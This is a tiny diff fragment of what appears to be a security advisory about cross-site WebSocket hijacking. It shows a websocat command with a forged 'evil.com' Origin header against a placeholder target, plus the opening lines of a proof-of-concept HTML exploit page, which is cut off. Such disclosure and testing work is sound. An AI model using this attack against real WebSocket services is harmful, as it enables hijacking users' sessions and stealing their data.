@@ -48,6 +48,7 @@ websocat -H "Origin: https://evil.com" "wss://TARGET/ws"
 ```
 
 **PoC HTML:**
+
 ```html
 <script>
 var ws = new WebSocket('wss://TARGET/ws');
